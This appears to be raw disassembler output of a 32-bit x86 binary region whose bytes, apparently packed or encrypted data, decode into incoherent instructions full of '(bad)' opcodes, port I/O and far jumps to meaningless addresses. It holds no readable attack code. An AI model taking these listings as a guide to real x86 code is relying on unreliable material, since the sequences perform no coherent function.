  419e17:	leave  
  419e18:	sbb    esi,ebp
  419e1a:	push   esp
  419e1b:	loop   0x419dde
  419e1d:	aad    0xce
  419e1f:	mov    edi,0x8bcf6cb3
  419e24:	rcl    esi,cl
  419e26:	and    eax,0x9cfc2301
  419e2b:	enter  0xf5f0,0x91
  419e2f:	std    
  419e30:	test   BYTE PTR [esi],ch
  419e32:	cmp    dl,dl
  419e34:	lods   eax,DWORD PTR ds:[esi]
  419e35:	cmp    BYTE PTR ds:0x5ed2dad7,dh
  419e3b:	mov    ah,0x14
  419e3d:	ret    0xd875
  419e40:	rcl    BYTE PTR [edx+ebx*1],1
  419e43:	aam    0x1c
  419e45:	cmc    
  419e46:	cdq    
  419e47:	or     BYTE PTR [ebp+eax*2+0x33],al
  419e4b:	pusha  
  419e4c:	(bad)  
  419e4d:	xchg   ebx,eax
  419e4e:	pop    es
  419e4f:	stos   BYTE PTR es:[edi],al
  419e50:	shl    BYTE PTR [eax+0x19],1
  419e53:	lods   eax,DWORD PTR ds:[esi]
  419e54:	sub    dh,BYTE PTR [esi]
  419e56:	or     al,al
  419e58:	cmp    BYTE PTR [eax],ch
  419e5a:	cmp    ah,BYTE PTR [esi]
  419e5c:	rol    DWORD PTR [ecx],0xfa
  419e5f:	adc    cl,BYTE PTR [ecx+eax*4+0x2a]
  419e63:	(bad)  
  419e64:	and    dl,BYTE PTR [ecx+eiz*1]
  419e67:	sub    BYTE PTR ds:0x1525eb79,dh
  419e6d:	lea    edx,[edi]
  419e6f:	ins    BYTE PTR es:[edi],dx
  419e70:	aam    0x4d
  419e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e73:	add    eax,0x3269b5f6
  419e78:	pushf  
  419e79:	adc    bl,bh
  419e7b:	std    
  419e7c:	cmp    DWORD PTR [edx+0x2c8e50d9],edi
  419e82:	les    esp,FWORD PTR [ebp-0x715bdee9]
  419e88:	lods   al,BYTE PTR ds:[esi]
  419e89:	mov    edi,0x7848c394
  419e8e:	push   ebx
  419e8f:	rcl    BYTE PTR [ecx],0x96
  419e92:	es in  eax,dx
  419e94:	push   ecx
  419e95:	test   al,0x1
  419e97:	pop    ecx
  419e98:	dec    ecx
  419e99:	es loopne 0x419e20
  419e9c:	sahf   
  419e9d:	xchg   ebp,eax
  419e9e:	pop    es
  419e9f:	mov    BYTE PTR [ebx+0x48],0x91
  419ea3:	mov    ds,edi
  419ea5:	adc    al,0x2c
  419ea7:	push   ebx
  419ea8:	sbb    al,0xf1
  419eaa:	mov    ebp,DWORD PTR [eax-0x69]
  419ead:	int    0x61
  419eaf:	pop    ebx
  419eb0:	push   edi
  419eb1:	inc    ecx
  419eb2:	(bad)  
  419eb3:	mov    eax,ds:0xd04884
  419eb8:	rol    ah,cl
  419eba:	stos   BYTE PTR es:[edi],al
  419ebb:	jmp    0xc6b0cd91
  419ec0:	dec    esp
  419ec1:	or     eax,0xf2872ac3
  419ec6:	pop    esp
  419ec7:	jp     0x419ee6
  419ec9:	add    al,0x2b
  419ecb:	int    0x71
  419ecd:	mov    ah,0xeb
  419ecf:	sbb    dh,BYTE PTR [edi-0x314d791e]
  419ed5:	aaa    
  419ed6:	dec    edi
  419ed7:	mov    ch,0x46
  419ed9:	das    
  419eda:	or     ecx,DWORD PTR [edi+0x7fd60874]
  419ee0:	jns    0x419f04
  419ee2:	inc    esi
  419ee3:	push   esp
  419ee4:	jp     0x419edc
  419ee6:	jg     0x419ed0
  419ee8:	ja     0x419f59
  419eea:	cmp    DWORD PTR [edx-0x61],edi
  419eed:	or     eax,0x0
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	add    eax,0x67cdac19
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	sub    BYTE PTR [ebx],dh
  419f70:	jo     0x419f0c
  419f72:	lock in eax,0xdf
  419f75:	mov    DWORD PTR [ebx],ebp
  419f77:	mov    eax,0x6e063336
  419f7c:	loop   0x419ff7
  419f7e:	push   ebx
  419f7f:	and    ah,dh
  419f81:	mov    edi,0xba85be47
  419f86:	retf   0xa43d
  419f89:	dec    esi
  419f8a:	nop
  419f8b:	mov    edi,0x97cf6f8d
  419f90:	mov    bh,bh
  419f92:	inc    ebx
  419f93:	icebp  
  419f94:	jge    0x419f5f
  419f96:	and    BYTE PTR [ebx-0x62],0xeb
  419f9a:	imul   ebx,DWORD PTR [ebp-0x1fceebea],0xffffffd7
  419fa1:	fwait
  419fa2:	or     al,0x80
  419fa4:	xchg   ebp,eax
  419fa5:	push   edx
  419fa6:	fnsave [eax+0x62]
  419fa9:	adc    DWORD PTR [ebp+esi*8+0x73a7f17f],ecx
  419fb0:	(bad)  
  419fb1:	inc    BYTE PTR [esi-0x15]
  419fb4:	ds je  0x41a027
  419fb7:	xor    BYTE PTR [esi-0x40e8fe55],al
  419fbd:	sar    BYTE PTR [edi+edi*4-0x67],cl
  419fc1:	xchg   ecx,eax
  419fc2:	retf   
  419fc3:	jmp    0x419ffb
  419fc5:	retf   0xca7d
  419fc8:	adc    ebx,ebx
  419fca:	xor    BYTE PTR [ecx],ch
  419fcc:	inc    esp
  419fcd:	repnz sbb BYTE PTR [ebx],bl
  419fd0:	fcmovnbe st,st(3)
  419fd2:	jl     0x41a04c
  419fd4:	xchg   esp,eax
  419fd5:	mov    ebx,DWORD PTR ds:0xae2337e0
  419fdb:	cmp    DWORD PTR [edi+0xb4eb96f],0xfffffff6
  419fe2:	aaa    
  419fe3:	sahf   
  419fe4:	loopne 0x41a00a
  419fe6:	sahf   
  419fe7:	pop    esi
  419fe8:	ret    
  419fe9:	and    DWORD PTR [ebx+0xc],0xffffff84
  419fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fee:	sub    BYTE PTR [ecx],ah
  419ff0:	fmul   st,st(7)
  419ff2:	jp     0x419ff7
  419ff4:	xchg   BYTE PTR [esi+0x48],ch
  419ff7:	inc    ecx
  419ff8:	push   esi
  419ff9:	inc    eax
  419ffa:	ins    DWORD PTR es:[edi],dx
  419ffb:	xchg   esp,ecx
  419ffd:	push   esp
  419ffe:	aaa    
  419fff:	retf   0x6c74
  41a002:	adc    ax,0x7f11
  41a006:	jge    0x41a043
  41a008:	stos   DWORD PTR es:[edi],eax
  41a009:	cli    
  41a00a:	fidivr DWORD PTR [eax+edx*1-0x35]
  41a00e:	cmp    eax,0x8b05c207
  41a013:	test   esp,esp
  41a015:	adc    BYTE PTR [esp+esi*4],al
  41a018:	test   al,0xf7
  41a01a:	or     al,0x2e
  41a01c:	retf   0x8d98
  41a01f:	icebp  
  41a020:	jp     0x419faf
  41a022:	rcr    BYTE PTR [ecx],0x1f
  41a025:	out    dx,eax
  41a026:	cmp    ebp,eax
  41a028:	cld    
  41a029:	aad    0xa9
  41a02b:	jmp    0x21530238
  41a030:	lahf   
  41a031:	scas   eax,DWORD PTR es:[edi]
  41a032:	iret   
  41a033:	jnp    0x41a048
  41a035:	xchg   edi,eax
  41a036:	push   0x14
  41a038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a039:	add    eax,0xad71d78f
  41a03e:	scas   eax,DWORD PTR es:[edi]
  41a03f:	loopne 0x41a0a3
  41a041:	pop    ebp
  41a042:	xchg   edi,eax
  41a043:	dec    esi
  41a044:	cdq    
  41a045:	or     al,0x4e
  41a047:	pop    ebx
  41a048:	out    dx,al
  41a049:	aam    0x39
  41a04b:	fimul  WORD PTR [ebx]
  41a04d:	inc    DWORD PTR [eax]
  41a04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a050:	jbe    0x41a090
  41a052:	inc    edi
  41a053:	dec    ebx
  41a054:	dec    edx
  41a055:	jno    0x41a0ab
  41a057:	cwde   
  41a058:	sub    eax,0x943865f9
  41a05d:	sub    esp,DWORD PTR [edi-0x14647b56]
  41a063:	xor    BYTE PTR [esi-0x10],al
  41a066:	jg     0x41a0cb
  41a068:	les    edx,FWORD PTR [ebx-0x3437b233]
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x67],bh
  41a0e3:	sub    bh,BYTE PTR [ebp+0x13]
  41a0e6:	sbb    BYTE PTR [bx+di],al
  41a0e9:	add    BYTE PTR [eax],al
  41a0eb:	add    DWORD PTR [eax],eax
  41a0ed:	add    cl,ch
  41a0ef:	mov    bh,0xbb
  41a0f1:	jmp    0x41a0f0
  41a0f3:	jo     0x41a0cc
  41a0f5:	hlt    
  41a0f6:	iret   
  41a0f7:	dec    esi
  41a0f8:	js     0x41a085
  41a0fa:	mov    eax,0x72e9dd25
  41a0ff:	inc    eax
  41a100:	push   0x46b67a49
  41a105:	mov    esp,0x2e100d4f
  41a10a:	add    DWORD PTR [esi],eax
  41a10c:	(bad)  
  41a10e:	outs   dx,DWORD PTR ds:[esi]
  41a10f:	inc    ebx
  41a110:	xchg   edx,eax
  41a111:	xchg   BYTE PTR [edi],al
  41a113:	test   eax,0xcfc0e538
  41a118:	xor    BYTE PTR [ebx-0x3e],dl
  41a11b:	pusha  
  41a11c:	dec    eax
  41a11d:	inc    ebp
  41a11e:	jl     0x41a11b
  41a120:	jmp    0xe2a3:0x7a3cc119
  41a127:	and    BYTE PTR [edi],bl
  41a129:	lods   eax,DWORD PTR ds:[esi]
  41a12a:	or     cl,BYTE PTR [ebx-0x53]
  41a12d:	gs inc edx
  41a12f:	xor    al,0x5d
  41a131:	mov    al,0x6f
  41a133:	or     esp,edx
  41a135:	pop    esp
  41a136:	outs   dx,BYTE PTR ds:[esi]
  41a137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a138:	mov    ecx,0xe8bcfab6
  41a13d:	push   0xffffffdd
  41a13f:	cmp    al,0xbf
  41a141:	lea    esi,[esp+edi*4+0x720e4529]
  41a148:	popf   
  41a149:	adc    al,0x97
  41a14b:	cdq    
  41a14c:	xor    al,BYTE PTR [ebx]
  41a14e:	fsubr  DWORD PTR [eax-0x7d]
  41a151:	les    edx,FWORD PTR [ebx+0x1b]
  41a154:	cmp    ecx,DWORD PTR [esp+edi*8+0x54]
  41a158:	cli    
  41a159:	adc    DWORD PTR [ebx-0x3ef88632],ecx
  41a15f:	das    
  41a160:	mov    eax,ds:0x38ea4eeb
  41a165:	cli    
  41a166:	iret   
  41a167:	cmp    DWORD PTR [esi+0x3e0ae0c9],ebp
  41a16d:	nop
  41a16e:	push   esi
  41a16f:	push   0xffffffff
  41a171:	sbb    ch,BYTE PTR [ecx]
  41a173:	mov    al,0x8b
  41a175:	push   es
  41a176:	fdiv   st,st(0)
  41a178:	ins    DWORD PTR es:[edi],dx
  41a179:	cdq    
  41a17a:	(bad)  
  41a17b:	mov    dh,0x2c
  41a17d:	inc    ecx
  41a17e:	sbb    al,0x1a
  41a180:	xor    DWORD PTR [eax-0x6a95484e],esi
  41a186:	(bad)  
  41a187:	(bad)  
  41a188:	xor    BYTE PTR [edi+edx*1],bl
  41a18b:	dec    eax
  41a18c:	bound  eax,QWORD PTR [esi+0x62]
  41a18f:	fs pop esi
  41a191:	popa   
  41a192:	inc    esi
  41a193:	mov    dh,0x64
  41a195:	bound  ebp,QWORD PTR [esi+0x3f0a7324]
  41a19b:	jle    0x41a12b
  41a19d:	outs   dx,DWORD PTR ds:[esi]
  41a19e:	fucomi st,st(1)
  41a1a0:	in     eax,dx
  41a1a1:	or     DWORD PTR [eax+esi*4-0x3a],ecx
  41a1a5:	jg     0x41a1b5
  41a1a7:	and    edi,ecx
  41a1a9:	adc    eax,0x7f2c1615
  41a1ae:	icebp  
  41a1af:	data16 neg BYTE PTR [ebp+ecx*1-0x5]
  41a1b4:	rol    BYTE PTR [esi+0x64e88fc2],1
  41a1ba:	rcl    DWORD PTR [ebp-0x21],1
  41a1bd:	call   0xab93fca
  41a1c2:	adc    esp,DWORD PTR [esi+0x1e]
  41a1c5:	xlat   BYTE PTR ds:[ebx]
  41a1c6:	xchg   ebp,eax
  41a1c7:	jecxz  0x41a1d2
  41a1c9:	push   esp
  41a1ca:	not    BYTE PTR [edi]
  41a1cc:	xor    BYTE PTR [esi-0x7e],dh
  41a1cf:	dec    edi
  41a1d0:	ja     0x41a168
  41a1d2:	and    DWORD PTR [edx+ebx*8-0x23bd14b3],ecx
  41a1d9:	popf   
  41a1da:	ror    BYTE PTR [edx-0xd],0x3c
  41a1de:	adc    ah,dl
  41a1e0:	rol    DWORD PTR [eax-0x2d],cl
  41a1e3:	push   0xffffff86
  41a1e5:	xlat   BYTE PTR ds:[ebx]
  41a1e6:	push   0x1e
  41a1e8:	and    DWORD PTR [eax+0x35440b31],0x0
	...
  41a253:	add    BYTE PTR [eax],al
  41a255:	add    BYTE PTR [esp+ecx*1],bl
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	or     al,0xee
  41a264:	bound  edi,QWORD PTR [ecx+0x67]
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [ecx+0x26],dh
  41a270:	lds    edi,FWORD PTR [ecx+eax*8+0x15]
  41a274:	es pop ecx
  41a276:	or     esp,DWORD PTR [edi+0x69]
  41a279:	add    ah,cl
  41a27b:	into   
  41a27c:	js     0x41a274
  41a27e:	and    ebp,DWORD PTR [edi+0xe]
  41a281:	mov    al,ds:0x22f10e16
  41a286:	xchg   BYTE PTR [eax+eax*8+0x39419a64],cl
  41a28d:	loopne 0x41a2bb
  41a28f:	enter  0xfba8,0xa0
  41a293:	sub    DWORD PTR [ecx+0x0],ecx
  41a296:	xchg   ecx,eax
  41a297:	or     DWORD PTR [esi-0x39a2b3c9],ebp
  41a29d:	sub    edi,DWORD PTR ds:0x7ded1898
  41a2a3:	and    DWORD PTR [edx],eax
  41a2a5:	push   ecx
  41a2a6:	mov    cl,0x6d
  41a2a8:	hlt    
  41a2a9:	xor    al,BYTE PTR [edx+0x19]
  41a2ac:	jne    0x41a2e5
  41a2ae:	jmp    0x9854:0x74e91e32
  41a2b5:	sub    al,al
  41a2b7:	cmp    eax,0xb222aa1d
  41a2bc:	test   esp,ebx
  41a2be:	jb     0x41a275
  41a2c0:	xchg   edx,ebx
  41a2c2:	xor    al,0xd1
  41a2c4:	inc    ecx
  41a2c5:	call   0xb813:0xb4698c5a
  41a2cc:	sub    eax,0x1db9d5bb
  41a2d1:	jae    0x41a268
  41a2d3:	or     ch,bh
  41a2d5:	popa   
  41a2d6:	scas   eax,DWORD PTR es:[edi]
  41a2d7:	mov    DWORD PTR [edi+0x8],edi
  41a2da:	cmp    DWORD PTR [ecx-0x1e],esi
  41a2dd:	mov    esp,0x18b2322e
  41a2e2:	arpl   WORD PTR [ebp+ebp*4+0x63],dx
  41a2e6:	mov    eax,0x7faedf1e
  41a2eb:	out    dx,al
  41a2ec:	mov    ebp,0x418ef793
  41a2f1:	int3   
  41a2f2:	neg    BYTE PTR [ebp+0x2e103470]
  41a2f8:	xchg   edx,eax
  41a2f9:	sub    al,0xeb
  41a2fb:	inc    esi
  41a2fc:	mov    ds:0xa46902ef,al
  41a301:	test   BYTE PTR [ebx+0x622feced],0x89
  41a308:	or     eax,0x77e17199
  41a30d:	dec    ebp
  41a30e:	push   ss
  41a30f:	retf   
  41a310:	adc    ebx,DWORD PTR [esi+0x4d]
  41a313:	xchg   ebp,eax
  41a314:	imul   esi,esp,0x5fb6d5b9
  41a31a:	aas    
  41a31b:	mov    esp,0xccd4bbf2
  41a320:	test   eax,0x6465f642
  41a325:	pop    esi
  41a326:	cmp    dl,BYTE PTR [ebx]
  41a328:	mov    DWORD PTR [edi-0x42],esp
  41a32b:	scas   al,BYTE PTR es:[edi]
  41a32c:	xor    BYTE PTR [ecx-0x5cdb89bf],ch
  41a332:	and    edx,eax
  41a334:	jns    0x41a2b7
  41a336:	fcomp  st(4)
  41a338:	sub    dl,BYTE PTR [edi]
  41a33a:	daa    
  41a33b:	inc    esi
  41a33c:	xor    edi,ebp
  41a33e:	xor    BYTE PTR [edi+0x5be36cbc],cl
  41a344:	mul    ch
  41a346:	sub    esp,esi
  41a348:	xchg   ecx,eax
  41a349:	add    BYTE PTR [ebx+0x55e175ca],bl
  41a34f:	xchg   esp,eax
  41a350:	jmp    0x6a95:0x358fa71a
  41a357:	jnp    0x41a35a
  41a359:	sub    esi,edi
  41a35b:	addr16 pushf 
  41a35d:	das    
  41a35e:	mov    ch,0xd5
  41a360:	test   ebx,edi
  41a362:	dec    esp
  41a363:	jmp    0x64654957
  41a368:	cmp    DWORD PTR [edx+0x35],edx
  41a36b:	lea    edi,[edi-0xd]
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	scas   al,BYTE PTR es:[edi]
  41a3e3:	pushf  
  41a3e4:	pop    eax
  41a3e5:	ja     0x41a44e
  41a3e7:	sbb    al,BYTE PTR [ecx]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [esi+0x73de8188],ch
  41a3f3:	fs inc esp
  41a3f5:	rcl    DWORD PTR [ecx],0x10
  41a3f8:	cmp    ebp,DWORD PTR [edi-0x5653d877]
  41a3fe:	rcr    BYTE PTR [ebx+0x3ba7e1f0],cl
  41a404:	add    al,0xd7
  41a406:	inc    ecx
  41a407:	int    0x1e
  41a409:	cmp    BYTE PTR ds:0x38a8e728,0x3f
  41a410:	pusha  
  41a411:	out    dx,eax
  41a412:	out    0xe4,eax
  41a414:	mov    cs,WORD PTR [eax-0x2455eeea]
  41a41a:	(bad)  
  41a41c:	xchg   edi,eax
  41a41d:	retf   
  41a41e:	clc    
  41a41f:	cmp    eax,0xb8ad6231
  41a424:	push   ecx
  41a425:	jg     0x41a48f
  41a427:	(bad)  
  41a428:	pop    esp
  41a429:	jnp    0x41a3ba
  41a42b:	mov    esp,0xa4e50ba
  41a430:	mov    ?,WORD PTR [eax+0x59]
  41a433:	iret   
  41a434:	test   eax,0xdf86dec1
  41a439:	jmp    0x41a486
  41a43b:	push   edi
  41a43c:	test   al,0xf6
  41a43e:	add    DWORD PTR [ecx+0x3ea06a7f],eax
  41a444:	mov    esp,0x4735f70e
  41a449:	jns    0x41a4c6
  41a44b:	pop    ebp
  41a44c:	(bad)  
  41a44d:	mov    ebx,0xa8f83a27
  41a452:	mov    ch,0x47
  41a454:	adc    eax,0x2b6b97a0
  41a459:	mov    eax,ds:0x2a358e74
  41a45e:	out    dx,al
  41a45f:	js     0x41a44b
  41a461:	jg     0x41a496
  41a463:	popf   
  41a464:	das    
  41a465:	push   0x6aa416cd
  41a46a:	mov    DWORD PTR [edx],esi
  41a46c:	daa    
  41a46d:	repnz pusha 
  41a46f:	shl    DWORD PTR [ebp+0x4df0a12b],1
  41a475:	outs   dx,BYTE PTR ds:[esi]
  41a476:	and    al,0x42
  41a478:	dec    ecx
  41a479:	xor    DWORD PTR [edi-0x50],ecx
  41a47c:	lds    edi,FWORD PTR [ebp+0x2d58eb12]
  41a482:	retf   0x2f73
  41a485:	pop    es
  41a486:	rol    DWORD PTR [ebp+0x5],0xd6
  41a48a:	sub    BYTE PTR [edi],al
  41a48c:	test   al,0xf0
  41a48e:	lock mov ds:0xcebc7998,eax
  41a494:	cwde   
  41a495:	div    DWORD PTR [ecx+0x2]
  41a498:	adc    DWORD PTR [eax],0xffffff9c
  41a49b:	sar    DWORD PTR [eax+eax*2+0x6c],cl
  41a49f:	push   0x93b5900d
  41a4a4:	pop    esi
  41a4a5:	inc    esp
  41a4a6:	ja     0x41a506
  41a4a8:	push   0xffffffcd
  41a4aa:	push   esp
  41a4ab:	(bad)  
  41a4ac:	loopne 0x41a437
  41a4ae:	mov    dh,0x19
  41a4b0:	popf   
  41a4b1:	dec    esi
  41a4b2:	mov    ds:0x1304f390,al
  41a4b7:	and    ah,BYTE PTR [eax+0x5]
  41a4ba:	enter  0xe511,0xcf
  41a4be:	sbb    al,0x38
  41a4c0:	xor    ecx,DWORD PTR [esi-0x3219fef4]
  41a4c6:	pop    ecx
  41a4c7:	push   ebp
  41a4c8:	pushf  
  41a4c9:	aad    0xb0
  41a4cb:	inc    esi
  41a4cc:	mov    esp,0x9fa98083
  41a4d1:	dec    esp
  41a4d2:	rol    BYTE PTR [esi-0x502274bd],0x21
  41a4d9:	iret   
  41a4da:	pop    esi
  41a4db:	popa   
  41a4dc:	in     eax,dx
  41a4dd:	push   ds
  41a4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4df:	out    dx,eax
  41a4e0:	lock ja 0x41a50d
  41a4e3:	push   0x5540edca
  41a4e8:	fdivr  st,st(1)
  41a4ea:	rcr    DWORD PTR [ecx+eax*2+0x20],0x0
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	sbb    DWORD PTR [edx],ebx
  41a564:	mov    eax,ds:0x11b67d4
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR [esi],al
  41a56f:	or     BYTE PTR [edx],dl
  41a571:	stc    
  41a572:	fiadd  WORD PTR [edi+eiz*8-0x289706a3]
  41a579:	ja     0x41a5ae
  41a57b:	mov    ebx,0x2314f27b
  41a580:	neg    DWORD PTR [ebx-0x54d91eba]
  41a586:	pop    ecx
  41a587:	lahf   
  41a588:	int    0xb5
  41a58a:	test   al,0xf6
  41a58c:	imul   ecx,DWORD PTR [di],0xd8b5f69e
  41a593:	das    
  41a594:	shr    DWORD PTR [edi+0x7f],cl
  41a597:	mov    ah,0x55
  41a599:	ror    DWORD PTR [ecx-0x6d],cl
  41a59c:	push   edi
  41a59d:	jl     0x41a5ce
  41a59f:	lea    edi,[edx+0x58e04b68]
  41a5a5:	dec    ebx
  41a5a6:	mov    BYTE PTR [edx],dl
  41a5a8:	jge    0x41a597
  41a5aa:	xlat   BYTE PTR ds:[ebx]
  41a5ab:	ret    0xf428
  41a5ae:	enter  0x2f1b,0xae
  41a5b2:	or     bh,BYTE PTR [ebp+0x13]
  41a5b5:	inc    ebx
  41a5b6:	pop    esp
  41a5b7:	int    0x32
  41a5b9:	mov    bh,0x8e
  41a5bb:	cli    
  41a5bc:	cwde   
  41a5bd:	aad    0xfa
  41a5bf:	fwait
  41a5c0:	push   eax
  41a5c1:	or     DWORD PTR [ecx+eiz*4-0x2c],eax
  41a5c5:	jge    0x41a62e
  41a5c7:	mov    edi,0x63efbbe0
  41a5cc:	call   0xc82ac837
  41a5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5d2:	imul   edi,edi,0xc6b25782
  41a5d8:	data16 mov es:0x37bfbf12,al
  41a5df:	xchg   edx,eax
  41a5e0:	sbb    eax,0x43e2a0ae
  41a5e5:	cmp    DWORD PTR [ebx+0x39],0xffffff8d
  41a5e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ea:	push   0xffffff9a
  41a5ec:	jbe    0x41a65d
  41a5ee:	in     al,dx
  41a5ef:	mov    BYTE PTR [edx],ah
  41a5f1:	mov    ebp,0x85d5a2fc
  41a5f6:	outs   dx,DWORD PTR ds:[esi]
  41a5f7:	adc    ch,dl
  41a5f9:	xor    ecx,edi
  41a5fb:	ins    BYTE PTR es:[edi],dx
  41a5fc:	mov    WORD PTR [ecx-0x234ca4b8],cs
  41a602:	pop    sp
  41a604:	dec    eax
  41a605:	mov    esi,edi
  41a607:	sahf   
  41a608:	inc    ebx
  41a609:	xchg   ebp,eax
  41a60a:	aas    
  41a60b:	mov    al,0xce
  41a60d:	and    BYTE PTR [eax+0x73],al
  41a610:	pop    ecx
  41a611:	sub    BYTE PTR [edx-0x4f],0xe5
  41a615:	rep ins DWORD PTR es:[edi],dx
  41a617:	into   
  41a618:	out    dx,al
  41a619:	arpl   WORD PTR [ebp+0x1a],ax
  41a61c:	loopne 0x41a68c
  41a61e:	dec    ecx
  41a61f:	inc    esp
  41a620:	shl    DWORD PTR [ebp+0x7f],cl
  41a623:	scas   al,BYTE PTR es:[edi]
  41a624:	outs   dx,DWORD PTR ds:[esi]
  41a625:	sub    DWORD PTR [ecx],esp
  41a627:	sub    al,0xf3
  41a629:	fbld   TBYTE PTR [esi]
  41a62b:	xor    dh,BYTE PTR [eax+0x32d70db4]
  41a631:	jns    0x41a62d
  41a633:	repz adc BYTE PTR [esi],bl
  41a636:	dec    ebx
  41a637:	dec    al
  41a639:	xchg   edx,eax
  41a63a:	jmp    ebp
  41a63c:	sbb    esp,esp
  41a63e:	(bad)  
  41a63f:	loop   0x41a5f0
  41a641:	sbb    eax,0x2181c7c5
  41a646:	and    ch,BYTE PTR [edi]
  41a648:	lds    edi,FWORD PTR [esi]
  41a64a:	mov    bh,BYTE PTR [edx-0x46504de3]
  41a650:	push   es
  41a651:	leave  
  41a652:	pop    ebx
  41a653:	cmp    DWORD PTR [ebx-0x2c1930c5],0x1b
  41a65a:	inc    edx
  41a65b:	add    ch,bh
  41a65d:	les    ebp,FWORD PTR [ebx+0x18c42a8b]
  41a663:	mov    ah,0xf
  41a665:	or     al,0xff
  41a667:	mov    edx,0xd9cec63e
  41a66c:	cs dec ebx
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x3491a625
  41a6e4:	popa   
  41a6e5:	shl    DWORD PTR [edi+0x1c],cl
  41a6e8:	add    DWORD PTR [eax],eax
  41a6ea:	add    BYTE PTR [ecx],al
  41a6ec:	add    BYTE PTR [eax],al
  41a6ee:	shr    BYTE PTR [edx-0x7d82f147],1
  41a6f4:	mov    edi,DWORD PTR [esi-0x4fc0ea02]
  41a6fa:	out    dx,eax
  41a6fb:	jmp    0x5260:0xe1fdc888
  41a702:	adc    BYTE PTR [esi],ah
  41a704:	lods   eax,DWORD PTR ds:[esi]
  41a705:	leave  
  41a706:	cpuid  
  41a708:	push   ebx
  41a709:	test   BYTE PTR [ecx],al
  41a70b:	mov    bl,0xb1
  41a70d:	aas    
  41a70e:	adc    dh,BYTE PTR [esi+0x29cb43d4]
  41a714:	(bad)  
  41a715:	imul   ebp,DWORD PTR [ebp+edi*4-0x39],0x39699113
  41a71d:	mov    esi,DWORD PTR [ecx-0x2d]
  41a720:	pop    ds
  41a721:	pop    ds
  41a722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a723:	je     0x41a6f6
  41a725:	dec    ebp
  41a726:	xor    DWORD PTR [ecx+0x44864fbe],esi
  41a72c:	jge    0x41a723
  41a72e:	adc    eax,0x9a000444
  41a733:	ins    DWORD PTR es:[edi],dx
  41a734:	test   eax,0xc0ac483
  41a739:	push   esi
  41a73a:	sub    DWORD PTR [edi-0x8b4a1cd],ecx
  41a740:	pop    ds
  41a741:	jae    0x41a709
  41a743:	inc    ecx
  41a744:	sbb    DWORD PTR [edi+0x15ceec3b],0xf40e4fe4
  41a74e:	mov    ds:0x6e755080,eax
  41a753:	adc    DWORD PTR [ebp+0x306655e2],ebp
  41a759:	(bad)  
  41a75a:	cwde   
  41a75b:	dec    edi
  41a75c:	pop    es
  41a75d:	sub    ah,BYTE PTR [ebp+edi*8+0x5cc8b666]
  41a764:	mov    edi,0x592101d1
  41a769:	mov    bh,0xd8
  41a76b:	sub    dl,BYTE PTR [ebx+0x6]
  41a76e:	repnz xlat BYTE PTR ds:[ebx]
  41a770:	sbb    eax,0xeeb7bb65
  41a775:	and    cl,BYTE PTR [ebx]
  41a777:	dec    esi
  41a778:	xchg   ebp,eax
  41a779:	enter  0x9cdd,0xdd
  41a77d:	add    BYTE PTR [ecx-0x37],dh
  41a780:	cmc    
  41a781:	sbb    eax,0xda78c10e
  41a786:	mov    ch,0x78
  41a788:	jl     0x41a7b5
  41a78a:	pop    ss
  41a78b:	push   esp
  41a78c:	mov    ah,0x5b
  41a78e:	push   ds
  41a78f:	ficom  WORD PTR [ebp+0x71e410dc]
  41a795:	xchg   edx,eax
  41a796:	and    esp,edx
  41a798:	or     BYTE PTR [edx],bl
  41a79a:	fidivr DWORD PTR [esi-0x5df5115e]
  41a7a0:	push   esp
  41a7a1:	js     0x41a813
  41a7a3:	mov    eax,0x250a26a5
  41a7a8:	inc    esi
  41a7a9:	scas   eax,DWORD PTR es:[edi]
  41a7aa:	clc    
  41a7ab:	mov    al,ds:0x87b74576
  41a7b0:	outs   dx,DWORD PTR ds:[esi]
  41a7b1:	pop    ds
  41a7b2:	popf   
  41a7b3:	cld    
  41a7b4:	ja     0x41a7e5
  41a7b6:	pop    ecx
  41a7b7:	or     eax,DWORD PTR [edx]
  41a7b9:	test   eax,0xccf326fb
  41a7be:	fist   DWORD PTR ds:0xc545010b
  41a7c4:	das    
